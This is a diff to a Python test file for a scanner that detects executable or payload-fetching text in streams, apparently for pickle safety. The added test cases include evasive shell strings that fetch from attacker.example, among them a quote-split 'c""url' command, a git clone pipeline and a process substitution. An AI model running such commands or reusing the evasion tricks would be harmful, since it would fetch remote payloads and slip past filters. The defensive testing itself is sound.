@@ -1086,6 +1086,7 @@ def test_scan_stream_detects_base64_encoded_execution_text(encoded: str, pattern
     [
         "See https://docs.example.invalid/reference/requests.get(url) for details",
         "Author's docs: https://example.invalid/a'b/os.system(cmd)",
+        "metadata = 'https://docs.example.invalid/requests.get(url)?a=1&b=2;c=3'",
         pytest.param(
             ("A" * 4096)
             + "https://docs.example.invalid/reference/requests.get(url)"
@@ -1296,6 +1297,10 @@ def test_scan_stream_encoded_decoded_byte_budgets_fail_closed(encoding: str) -> 
         "/usr/local/bin/wget " + ("--header=x " * 48) + "use documentation now https://attacker.example/payload",
         "requests.get(\\\n    'https://attacker.example/payload')",
         "requests.get(\\\r\n    'https://attacker.example/payload')",
+        "Use documentation example metadata | git clone https://attacker.example/payload",
+        'Use documentation example metadata; c""url https://attacker.example/payload',
+        "Use documentation example metadata <(git clone https://attacker.example/payload )",
+        'f"{client:https://attacker.example/payload}"',
     ],
     ids=[
         "alias",
@@ -1319,6 +1324,10 @@ def test_scan_stream_encoded_decoded_byte_budgets_fail_closed(encoding: str) -> 
         "truncated-line-prefix",
         "lf-continuation",
         "crlf-continuation",
+        "prose-prefixed-shell-pipeline",
+        "quote-joined-shell-command",
+        "process-substitution",
+        "f-string-format-dispatch",
     ],
 )
 def test_scan_stream_keeps_executable_pickle_urls_actionable(loader: str, protocol: int) -> None:
